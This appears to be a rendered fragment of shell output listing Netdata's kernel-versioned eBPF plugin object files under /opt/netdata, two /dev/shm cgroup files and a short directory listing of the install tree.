+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_network_viewer.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fdatasync.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_disk.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_syncfs.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_ext4.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fsync.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_hardirq.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_softirq.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fd.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_syncfs.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_ext4.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_zfs.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_dc.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_process.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_cachestat.5.15.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_shm.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_shm.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_hardirq.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_vfs.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_network_viewer.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mount.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_softirq.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mount.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync_file_range.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_socket.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_vfs.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fd.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_ext4.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_vfs.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_network_viewer.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_oomkill.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_msync.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_dc.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_btrfs.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync_file_range.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_oomkill.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_disk.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_oomkill.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mount.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_hardirq.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_softirq.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fdatasync.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fdatasync.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync_file_range.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_nfs.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fsync.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mdflush.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_softirq.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_disk.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_msync.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_zfs.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fsync.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_softirq.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_dc.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_oomkill.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_ext4.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_shm.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mount.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_process.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mount.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_nfs.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_xfs.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mount.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mdflush.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fsync.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_zfs.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mount.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fd.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fsync.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fsync.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fd.5.11.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_softirq.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_socket.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_swap.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_hardirq.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_ext4.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_syncfs.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fdatasync.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_cachestat.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_msync.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_vfs.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_socket.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_hardirq.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_xfs.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_cachestat.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_syncfs.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_msync.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_syncfs.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_hardirq.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_shm.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_cachestat.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_softirq.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_msync.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_dc.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_softirq.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_ext4.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_swap.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_btrfs.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mdflush.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fdatasync.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fd.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_dc.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_oomkill.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_xfs.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_shm.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_hardirq.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_vfs.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_vfs.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_cachestat.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync_file_range.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_cachestat.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_nfs.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_swap.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fd.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_cachestat.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_btrfs.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mdflush.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fdatasync.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_swap.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mdflush.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_cachestat.5.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_zfs.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_disk.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_oomkill.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_network_viewer.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_btrfs.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_btrfs.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mdflush.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_process.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_vfs.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_btrfs.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mdflush.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_syncfs.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_network_viewer.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_network_viewer.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_btrfs.5.10.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync_file_range.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_xfs.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync_file_range.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_dc.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_zfs.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_syncfs.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_oomkill.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_vfs.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_softirq.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fdatasync.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_zfs.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_syncfs.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_msync.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_zfs.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_dc.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync_file_range.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fd.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fd.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_process.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_network_viewer.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_xfs.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mdflush.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mdflush.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_shm.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_cachestat.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_process.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_shm.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_xfs.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_hardirq.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_nfs.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_cachestat.5.15.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_socket.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_oomkill.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_process.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_socket.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fsync.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_network_viewer.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_zfs.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_oomkill.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_dc.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_disk.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fd.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_process.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_nfs.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fsync.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_msync.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_oomkill.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_btrfs.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fdatasync.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_ext4.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_nfs.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_disk.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_btrfs.5.10.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_nfs.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mount.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fdatasync.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_xfs.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_nfs.5.14.o</span></span>
+<span class="giallo-l"><span>/dev/shm/netdata_sem_cgroup_ebpf</span></span>
+<span class="giallo-l"><span>/dev/shm/netdata_shm_cgroup_ebpf</span></span>
+<span class="giallo-l"><span>total 32K</span></span>
+<span class="giallo-l"><span>drwxr-xr-x 8 root    root    4.0K Jul  8  2025 .</span></span>
+<span class="giallo-l"><span>drwxr-xr-x 4 root    root    4.0K Jul  8  2025 ..</span></span>
+<span class="giallo-l"><span>drwxr-xr-x 3 root    root    4.0K Jul  8  2025 bin</span></span>
+<span class="giallo-l"><span>drwxr-xr-x 3 root    root    4.0K Jul  8  2025 etc</span></span>
+<span class="giallo-l"><span>lrwxrwxrwx 1 root    root      11 Jun 15  2025 netdata-configs -&gt; etc/netdata</span></span>
+<span class="giallo-l"><span>lrwxrwxrwx 1 root    root      15 Jun 15  2025 netdata-dbs -&gt; var/lib/netdata</span></span>
